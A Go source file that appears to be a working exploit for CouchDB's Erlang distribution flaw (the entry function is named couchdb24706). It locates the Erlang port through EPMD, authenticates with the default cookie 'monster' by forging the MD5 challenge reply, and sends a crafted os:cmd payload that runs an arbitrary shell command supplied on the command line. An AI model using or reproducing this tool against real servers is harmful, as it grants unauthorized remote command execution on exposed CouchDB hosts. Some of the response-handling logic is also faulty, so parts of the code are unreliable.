package main

import (
	"crypto/md5"
	"encoding/binary"
	"errors"
	"fmt"
	"go.uber.org/zap"
	"io"
	"net"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
)

type SocketClient interface {
	SocketConnect() (*Socket, error)
	Write(msg []byte)
	Revce() ([]byte, error)
}
type Socket struct {
	proto    string   `json:"proto"`
	Host     string   `json:"host"`
	Port     int      `json:"port"`
	Conn     net.Conn `json:"coon"`
	response []byte   `json:"response"`
}

const (
	EPMD_PORT = 4369 // EPMD默认端口
	Empty     = 0
)

// New creates a new socket  client.
func NewSocket() *Socket {
	client := new(Socket)
	return client
}
func (s *Socket) SocketConnect() (*Socket, error) {
	epm_socket, err := net.Dial(s.proto, fmt.Sprintf("%s:%d", s.Host, s.Port))
	if err != nil {

		return s, err
	}
	s.Conn = epm_socket

	return s, nil
}
func (s *Socket) Write(msg []byte) error {
	_, err := s.Conn.Write(msg)
	if err != nil {
		return err
	}

	return nil
}
func (s *Socket) Revce() ([]byte, error) {
	buffer := make([]byte, 1024) // 使用适当大小的缓冲区

	for {
		n, err := s.Conn.Read(buffer)
		if err != nil {
			if err == io.EOF {
				break // 读取完毕
			} else {
				return s.response, err
			}
		}
		s.response = append(s.response, buffer[:n]...)
	}
	return s.response, nil
}

// Connect to EPMD find Erlang port:
func FindErlangPort(ip string) (int, error) {
	var EPM_NAME_CMD = []byte("\x00\x01\x6e") // Request for nodes list
	var responedata []string
	epm_config := Socket{
		Host:  ip,
		Port:  EPMD_PORT,
		proto: "tcp",
	}
	epm_socket, err := epm_config.SocketConnect()
	if err != nil {
		Logger.Error("连接错误", zap.String("socket连接失败", err.Error()))
		return Empty, errors.New("socket连接失败")
	}
	defer epm_socket.Conn.Close()
	err = epm_socket.Write(EPM_NAME_CMD)
	if err != nil {
		Logger.Error("写入错误", zap.String("socket写入内容失败", err.Error()))
		return Empty, errors.New("socket写入内容失败")
	}
	revceMsg, err := epm_socket.Revce()
	if err != nil {
		Logger.Error("读取错误", zap.String("socket读取内容失败", err.Error()))
		return Empty, errors.New("socket读取错误")
	}

	if strings.Contains(string(revceMsg), "port") {
		dataSlice := regexp.MustCompile("\r?\n").Split(string(revceMsg), -1)
		if dataSlice == nil {
			Logger.Error("获取数据为空", zap.Field{})
			return Empty, errors.New("获取数据为空")
		}

		for _, data := range dataSlice {
			if !IsNull([]byte(data)) {
				responedata = append(responedata, data)
			}
		}
		var choise int
		if len(responedata) == 1 {
			choise = 1
			Logger.Debug("获取数据", zap.String("数据内容", responedata[0]))
		} else {
			Logger.Debug("存在多组数据需要进行选择", zap.Strings("数据内容", responedata))

			for i, line := range dataSlice {
				Logger.Debug("数据内容", zap.Int("行数为:", i+1), zap.String("行内容为", line))

			}
			Logger.Debug("等待输入", zap.Field{})

			_, err := fmt.Scanf("%d", &choise)
			if err != nil || choise < 1 || choise > len(dataSlice) {
				Logger.Error("无效输入", zap.Field{})
				return Empty, errors.New("无效输入")
			}

		}
		portMatch := regexp.MustCompile(`\d+$`).FindString(dataSlice[choise-1])
		if portMatch != "" {
			ERLNAG_PORT, err := strconv.Atoi(portMatch)
			if err != nil {
				Logger.Error("转换端口类型失败", zap.Field{})

				return Empty, err
			} else {
				Logger.Info("", zap.Int("获取到了服务端口", ERLNAG_PORT))
				return ERLNAG_PORT, nil

			}
		}
	} else {
		Logger.Error("node请求获取失败", zap.Field{})

		return Empty, err
	}
	epm_socket.Conn.Close()
	return Empty, nil
}
func ConnectErlang(ip string, CMD string) (string, error) {
	var CHALLENGE_REPLY = []byte("\x00\x15r\x01\x02\x03\x04")
	var COOKIE = "monster" // Default Erlang cookie for CouchDB

	var NAME_MSG = []byte("\x00\x15n\x00\x05\x00\x07\x49\x9cAAAAAA@AAAAAAA")
	var msg string
	ports, err := FindErlangPort(ip)
	if err != nil {
		Logger.Error("查询集群通信接口失败", zap.Error(err))
		return "", errors.New("查询集群通信接口失败" + err.Error())
	}
	s := Socket{
		Host:  ip,
		Port:  ports,
		proto: "tcp",
	}

	s.SocketConnect()
	s.Conn.Write(NAME_MSG)
	response := make([]byte, 5)
	_, err = s.Conn.Read(response)
	if err != nil {
		Logger.Error("读取数据失败", zap.String("Failed to read response: %s\nTerminating program\n", err.Error()))
		return "", errors.New("读取数据失败" + err.Error())
	}

	// 接收 challenge 消息
	challengeBytes := make([]byte, 1024)
	_, err = s.Conn.Read(challengeBytes)
	if err != nil {
		Logger.Error("读取数据失败", zap.String("Failed to read response: %s\nTerminating program\n", err.Error()))
		return "", errors.New("读取数据失败" + err.Error())
	}

	// 打印 CHALLENGE_REPLY
	//fmt.Printf("%x\n", challengeBytes)
	//fmt.Printf("%x\n", challengeBytes[9:13])

	// 使用 binary.BigEndian.Uint32 解析字节数组
	value := binary.BigEndian.Uint32(challengeBytes[9:13])
	strValue := strconv.FormatUint(uint64(value), 10)
	// 将字符串转换为 []byte
	challengeByte := []byte(strValue)
	//fmt.Printf("解析后的 uint32 值为: %d\n", value)

	// 将 COOKIE 和 challenge 转换为字节数组
	cookieBytes := []byte(COOKIE)
	//fmt.Printf("%x\n", challengeByte)

	// 创建一个 MD5 哈希对象
	hash := md5.New()

	// 将 COOKIE 和 challenge 数据写入哈希对象
	result := append(cookieBytes, challengeByte...)
	//fmt.Printf("%x\n", result)
	hash.Write(result)
	// 计算 MD5 哈希值
	hashBytes := hash.Sum(nil)
	CHALLENGE_REPLY = append(CHALLENGE_REPLY, hashBytes...)

	//fmt.Printf("%x\n", CHALLENGE_REPLY)
	s.Conn.Write(CHALLENGE_REPLY)
	rescBytes := make([]byte, 1024)
	_, err = s.Conn.Read(rescBytes)

	//fmt.Printf("%x\n", rescBytes)
	if err != nil {
		Logger.Error("读取数据失败", zap.String("Failed to receive challenge message:", err.Error()))
		return "", errors.New("读取数据失败" + err.Error())

	}
	//if len(resBytes) == 0 {
	//	fmt.Println("bnull")
	//}
	data_size := 0

	if data_size <= 0 {
		if CMD == "" {
			Logger.Error("CMD为空")
			return "", errors.New("命令为空")
		}

		// 发送命令
		_, err := s.Conn.Write(Compile_cmd(CMD))
		if err != nil {
			Logger.Error("发送数据失败", zap.String("Failed to send command: %s\nTerminating program\n", err.Error()))
			return "", errors.New("发送数据失败" + err.Error())
		}

		// 接收数据大小
		dataSizeBytes := make([]byte, 1024)
		n, err := s.Conn.Read(dataSizeBytes)
		if err != nil {
			Logger.Error("接收数据失败", zap.String("Failed to read data size: %s\nTerminating program\n", err.Error()))
			return "", errors.New("接收数据失败" + err.Error())
		}

		msg = fmt.Sprintf("%s", dataSizeBytes[:n])

		data_size, _ = strconv.Atoi(string(dataSizeBytes))
		data_size -= 45 // 数据大小不包括控制消息
	} else if data_size < 1024 {
		data := make([]byte, data_size)
		_, err := s.Conn.Read(data)
		if err != nil {
			Logger.Error("读取数据失败", zap.String("Failed to read data: %s\nTerminating program\n", err.Error()))
			return "", errors.New("读取数据失败" + err.Error())
		}

		// 处理数据，注意根据需要解码数据
		msg = (string(data[3:]))
		fmt.Println(string(data[3:])) // 根据实际情况选择适当的解码方式
		data_size = 0
	} else {
		data := make([]byte, 1024)
		_, err := s.Conn.Read(data)
		if err != nil {
			Logger.Error("读取数据失败", zap.String("Failed to read data: %s\nTerminating program\n", err.Error()))
			return "", errors.New("读取数据失败" + err.Error())

		}
		msg = (string(data[4:]))
		// 处理数据，注意根据需要解码数据
		fmt.Println(string(data[4:])) // 根据实际情况选择适当的解码方式
		data_size -= 1024
	}

	//time.Sleep(100 * time.Millisecond)
	Logger.Info("执行成功", zap.String("结果为:", msg))
	s.Conn.Close()
	return msg, nil
}
func Compile_cmd(CMD string) []byte {
	var CTRL_DATA = []byte("\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00w\x00w\x03rex")
	MSG := []byte("\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00")
	MSG1 := []byte("\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k")

	MSG2 := []byte("jw\x04user")
	MSG = append(MSG, MSG1...)
	//fmt.Printf("%x\n", MSG)
	cmdLength := uint16(len(CMD))

	// 创建一个2字节的切片来存储cmdLength
	cmdLengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(cmdLengthBytes, cmdLength)

	MSG = append(MSG, []byte(cmdLengthBytes)...)
	MSG = append(MSG, []byte(CMD)...)

	//fmt.Printf("%x\n", MSG)
	MSG = append(MSG, MSG2...)

	PAYLOAD := []byte("\x70")
	PAYLOAD = append(PAYLOAD, CTRL_DATA...)
	PAYLOAD = append(PAYLOAD, MSG...)
	//fmt.Printf("%x\n", CTRL_DATA)
	// 将PAYLOAD的长度打包成4字节的大端整数
	payloadLength := make([]byte, 4)
	binary.BigEndian.PutUint32(payloadLength, uint32(len(PAYLOAD)))
	// 拼接payloadLength和PAYLOAD
	PAYLOAD = append(payloadLength, PAYLOAD...)
	//fmt.Printf("%x\n", PAYLOAD)
	return PAYLOAD
}

// start函数
func couchdb24706(args ...interface{}) (interface{}, error) {
	if len(os.Args) < 3 {
		Logger.Info("请提供文件名作为参数")
		return nil, nil
	}

	// 获取命令行传递的文件名
	uri := os.Args[1]
	cmd := os.Args[2]

	parsedURL, err := url.Parse(uri)
	if err != nil {
		Logger.Error("URL解析错误:", zap.Error(err))
		return "", err
	}

	result, err := ConnectErlang(parsedURL.Hostname(), cmd)
	if err != nil {
		Logger.Error("执行错误", zap.Error(err))
		return "", err
	}
	return result, nil
}
func IsNull(data []byte) bool {
	allNullBytes := true

	for _, b := range data {
		if b != 0x00 {
			allNullBytes = false
			break
		}
	}

	return allNullBytes

}
